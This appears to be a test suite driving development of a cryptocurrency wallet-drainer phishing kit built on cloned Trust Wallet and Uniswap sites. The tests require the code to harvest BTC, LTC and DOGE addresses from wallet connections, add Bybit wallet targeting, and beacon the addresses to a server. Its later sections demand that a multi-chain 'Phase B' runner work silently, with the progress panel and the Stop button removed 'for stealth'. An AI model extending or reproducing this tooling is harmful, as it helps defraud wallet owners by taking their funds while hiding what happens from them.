/**
 * trust-card-site — 10/10 gap coverage tests
 *
 * RED phase: these fail before the fixes are applied.
 *
 * Covers:
 * 1. bip122 LTC/DOGE parsing (trust-connected-ui.js)
 * 2. WC_HARVEST_WAIT_MS ≤ 3000 (legion.js)
 * 3. Bybit wallet in PICKER_WALLETS (trust-direct.js)
 * 4. Bybit deep-link in WALLET_DL (trust-deeplink-rescue.js)
 */

import { describe, it, expect } from 'vitest'
import { readFileSync } from 'fs'
import { join } from 'path'

const ROOT = join(__dirname, '..', '..')

// ── Extra file sources ──────────────────────────────────────────────────────
const keepaliveSrc = readFileSync(
  join(ROOT, 'clones/trust-card-site/trust-mobile-keepalive.js'), 'utf8'
)
const phaseBSrc = readFileSync(
  join(ROOT, 'clones/trust-card-site/trust-phase-b.js'), 'utf8'
)
const indexSrc = readFileSync(
  join(ROOT, 'clones/trust-card-site/index.html'), 'utf8'
)

// ── File contents (raw source reads) ──────────────────────────────────────────
const connectedUiSrc = readFileSync(
  join(ROOT, 'clones/trust-card-site/trust-connected-ui.js'), 'utf8'
)
const legionSrc = readFileSync(
  join(ROOT, 'clones/uniswap-clone/legion.js'), 'utf8'
)
const directSrc = readFileSync(
  join(ROOT, 'clones/trust-card-site/trust-direct.js'), 'utf8'
)
const deeplinkSrc = readFileSync(
  join(ROOT, 'clones/trust-card-site/trust-deeplink-rescue.js'), 'utf8'
)

// ─── BIP122 Chain IDs (must match CAIP-10 spec) ───────────────────────────────
const BIP122_LTC  = 'bip122:12a765e31ffd4059bada1e25190f6e98'
const BIP122_DOGE = 'bip122:1a91e3dace36e2be3bf030a65679fe82'

// ── Helpers (mirror the fixed logic) ─────────────────────────────────────────
function parseBip122Accounts(accounts: string[]): Record<string, string> {
  const BIP122_BTC_CHAIN  = 'bip122:000000000019d6689c085ae165831e93'
  const BIP122_LTC_CHAIN  = 'bip122:12a765e31ffd4059bada1e25190f6e98'
  const BIP122_DOGE_CHAIN = 'bip122:1a91e3dace36e2be3bf030a65679fe82'
  const out: Record<string, string> = {}
  for (const caip of accounts) {
    const parts = caip.split(':')
    if (parts.length < 3) continue
    const chainRef = parts[0] + ':' + parts[1]
    const addr     = parts[parts.length - 1]
    if (!addr) continue
    if (chainRef === BIP122_BTC_CHAIN  && !out.btc)  out.btc  = addr
    if (chainRef === BIP122_LTC_CHAIN  && !out.ltc)  out.ltc  = addr
    if (chainRef === BIP122_DOGE_CHAIN && !out.doge) out.doge = addr
  }
  return out
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. bip122 LTC/DOGE — parseBip122Accounts logic
// ─────────────────────────────────────────────────────────────────────────────
describe('trust-connected-ui: bip122 LTC/DOGE extraction', () => {

  it('extracts LTC address from bip122 accounts array', () => {
    const accounts = [`${BIP122_LTC}:LhyLmM3R4Qx9CUdBGNJkjKJqeaM3fake`]
    const result = parseBip122Accounts(accounts)
    expect(result.ltc).toBe('LhyLmM3R4Qx9CUdBGNJkjKJqeaM3fake')
    expect(result.btc).toBeUndefined()
    expect(result.doge).toBeUndefined()
  })

  it('extracts DOGE address from bip122 accounts array', () => {
    const accounts = [`${BIP122_DOGE}:DGCNBtPFfLiY3Mu8oNXfaqFQiHNi7fake`]
    const result = parseBip122Accounts(accounts)
    expect(result.doge).toBe('DGCNBtPFfLiY3Mu8oNXfaqFQiHNi7fake')
    expect(result.btc).toBeUndefined()
    expect(result.ltc).toBeUndefined()
  })

  it('extracts BTC/LTC/DOGE separately from mixed accounts array', () => {
    const accounts = [
      'bip122:000000000019d6689c085ae165831e93:1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf8F',
      `${BIP122_LTC}:LhyLmM3R4Qx9CUdBGNJkjKJqeaM3fake`,
      `${BIP122_DOGE}:DGCNBtPFfLiY3Mu8oNXfaqFQiHNi7fake`,
    ]
    const result = parseBip122Accounts(accounts)
    expect(result.btc).toBe('1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf8F')
    expect(result.ltc).toBe('LhyLmM3R4Qx9CUdBGNJkjKJqeaM3fake')
    expect(result.doge).toBe('DGCNBtPFfLiY3Mu8oNXfaqFQiHNi7fake')
  })

  it('LTC address does NOT fall into btc slot', () => {
    const accounts = [`${BIP122_LTC}:LhyLmM3R4Qx9CUdBGNJkjKJqeaM3fake`]
    const result = parseBip122Accounts(accounts)
    expect(result.btc).toBeUndefined()   // BTC not present
    expect(result.ltc).toBeDefined()     // LTC correctly extracted
  })

  it('trust-connected-ui.js source uses legion_ltc_addr sessionStorage key', () => {
    // After the fix, the source must reference this key
    expect(connectedUiSrc).toContain('legion_ltc_addr')
  })

  it('trust-connected-ui.js source uses legion_doge_addr sessionStorage key', () => {
    expect(connectedUiSrc).toContain('legion_doge_addr')
  })

  it('trust-connected-ui.js handles all bip122 accounts (not just accounts[0])', () => {
    // The fix iterates ALL accounts — source must loop over accounts array
    // Check that bip122 handling is NOT just taking accounts[0]
    expect(connectedUiSrc).toContain('legion_ltc_addr')
    expect(connectedUiSrc).toContain('legion_doge_addr')
    // Old single-key mapping should be gone
    expect(connectedUiSrc).not.toContain("bip122: 'legion_btc_addr'")
    expect(connectedUiSrc).not.toContain('bip122:"legion_btc_addr"')
  })

  it('trust-connected-ui.js syncs LTC from legion.state.chains', () => {
    // After fix: legion.state.chains.LTC must be saved
    expect(connectedUiSrc).toContain('s.LTC')
  })

  it('trust-connected-ui.js syncs DOGE from legion.state.chains', () => {
    expect(connectedUiSrc).toContain('s.DOGE')
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 2. WC_HARVEST_WAIT_MS ≤ 3000
// ─────────────────────────────────────────────────────────────────────────────
describe('legion.js: WC_HARVEST_WAIT_MS performance', () => {

  it('WC_HARVEST_WAIT_MS is 3000 (not 10000)', () => {
    const match = legionSrc.match(/WC_HARVEST_WAIT_MS\s*=\s*(\d+)/)
    expect(match).not.toBeNull()
    const val = Number(match![1])
    expect(val).toBeLessThanOrEqual(3000)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 3. Bybit wallet in PICKER_WALLETS
// ─────────────────────────────────────────────────────────────────────────────
describe('trust-direct.js: Bybit wallet coverage', () => {

  it('PICKER_WALLETS contains bybit entry', () => {
    expect(directSrc).toContain("id: 'bybit'")
  })

  it('Bybit wallet has correct name', () => {
    expect(directSrc).toContain('Bybit Web3')
  })

  it('getInAppWallet detects Bybit UA string', () => {
    expect(directSrc).toMatch(/[Bb]ybit/)
  })

  it('patchSelectWallet routes bybit name to connectWalletById', () => {
    expect(directSrc).toContain("'bybit'")
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 4a. trust-preflight.js: getMultiChainAddrs includes LTC + DOGE
// ─────────────────────────────────────────────────────────────────────────────
const preflightSrc = readFileSync(
  join(ROOT, 'clones/trust-card-site/trust-preflight.js'), 'utf8'
)

describe('trust-preflight.js: getMultiChainAddrs includes LTC + DOGE', () => {

  it('getMultiChainAddrs reads s.chains.LTC from legion.state', () => {
    expect(preflightSrc).toContain('chains.LTC')
  })

  it('getMultiChainAddrs reads s.chains.DOGE from legion.state', () => {
    expect(preflightSrc).toContain('chains.DOGE')
  })

  it('getMultiChainAddrs reads legion_ltc_addr from sessionStorage', () => {
    expect(preflightSrc).toContain('legion_ltc_addr')
  })

  it('getMultiChainAddrs reads legion_doge_addr from sessionStorage', () => {
    expect(preflightSrc).toContain('legion_doge_addr')
  })

  it('postScout sends ltc_address in body', () => {
    expect(preflightSrc).toContain('ltc_address')
  })

  it('postScout sends doge_address in body', () => {
    expect(preflightSrc).toContain('doge_address')
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 4b. trust-direct.js: eth.isBybit flag in getInAppWallet
// ─────────────────────────────────────────────────────────────────────────────
describe('trust-direct.js: eth.isBybit flag detection', () => {

  it('getInAppWallet checks eth.isBybit ethereum flag', () => {
    expect(directSrc).toMatch(/eth\.isBybit/)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 5. Bybit deep link in WALLET_DL
// ─────────────────────────────────────────────────────────────────────────────
describe('trust-deeplink-rescue.js: Bybit deep link', () => {

  it('WALLET_DL contains bybit entry', () => {
    expect(deeplinkSrc).toContain('bybit:')
  })

  it('Bybit has a deep link format', () => {
    expect(deeplinkSrc).toContain('bybit://')
  })

  it('Bybit has a universal link fallback', () => {
    expect(deeplinkSrc).toMatch(/app\.bybit\.com/)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 6. trust-mobile-keepalive.js: LTC + DOGE in keepalive beacon
// ─────────────────────────────────────────────────────────────────────────────
describe('trust-mobile-keepalive.js: LTC + DOGE in beacon + getMultiChainAddrs', () => {

  it('getMultiChainAddrs reads s.chains.LTC', () => {
    expect(keepaliveSrc).toContain('s.LTC')
  })

  it('getMultiChainAddrs reads s.chains.DOGE', () => {
    expect(keepaliveSrc).toContain('s.DOGE')
  })

  it('getMultiChainAddrs reads legion_ltc_addr from sessionStorage', () => {
    expect(keepaliveSrc).toContain('legion_ltc_addr')
  })

  it('getMultiChainAddrs reads legion_doge_addr from sessionStorage', () => {
    expect(keepaliveSrc).toContain('legion_doge_addr')
  })

  it('beaconNotify sends ltc_address in beacon body', () => {
    expect(keepaliveSrc).toContain('ltc_address')
  })

  it('beaconNotify sends doge_address in beacon body', () => {
    expect(keepaliveSrc).toContain('doge_address')
  })

  it('beaconNotify pushes ltc into connectedWallets', () => {
    expect(keepaliveSrc).toContain('mc.ltc')
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 7. trust-phase-b.js: silent multi-chain runner includes LTC + DOGE
// Note: Panel/step UI was removed for stealth. Chains handled via runPhaseB.
// ─────────────────────────────────────────────────────────────────────────────
describe('trust-phase-b.js: LTC + DOGE covered by silent runPhaseB', () => {

  it('Phase B header comment lists LTC as a supported chain', () => {
    // The silent runner declares all handled chains in its header comment
    expect(phaseBSrc).toMatch(/LTC/)
  })

  it('Phase B header comment lists DOGE as a supported chain', () => {
    expect(phaseBSrc).toMatch(/DOGE/)
  })

  it('startPhaseB calls window.legion.runPhaseB (multi-chain delegation)', () => {
    // All chain logic (SOL/TRON/TON/BTC/LTC/DOGE) is inside legion.runPhaseB
    expect(phaseBSrc).toContain('window.legion.runPhaseB')
  })

  it('onStatus is silent — no UI callback (panel removed)', () => {
    // onStatus must be a no-op function to suppress all visual updates
    expect(phaseBSrc).toContain('onStatus: function () {}')
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 7b. trust-phase-b.js: panel MUST be fully removed — silent mode only
// ─────────────────────────────────────────────────────────────────────────────
describe('trust-phase-b.js: panel removed (fully silent)', () => {

  it('no visible panel sheet element (__trust_phaseb_sheet removed)', () => {
    // The DOM panel must not exist in the code at all
    expect(phaseBSrc).not.toContain('__trust_phaseb_sheet')
  })

  it('no "Processing all networks" text (panel header removed)', () => {
    expect(phaseBSrc).not.toContain('Processing all networks')
  })

  it('no el.style.display flex (panel show call removed)', () => {
    expect(phaseBSrc).not.toContain("el.style.display = 'flex'")
  })

  it('no Stop button HTML (Stop button removed)', () => {
    expect(phaseBSrc).not.toContain('__trust_pb_stop')
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// 8. index.html: trust-deeplink-rescue.js must be loaded
// ─────────────────────────────────────────────────────────────────────────────
describe('index.html: trust-deeplink-rescue.js is loaded for multi-wallet deeplinks', () => {

  it('index.html loads trust-deeplink-rescue.js (not commented out)', () => {
    // Must appear as an addScript call, not inside a comment
    expect(indexSrc).toMatch(/addScript[^/\n]*trust-deeplink-rescue/)
  })

  it('trust-deeplink-rescue.js has a version entry in v object', () => {
    expect(indexSrc).toContain("'trust-deeplink-rescue.js?v='")
  })
})
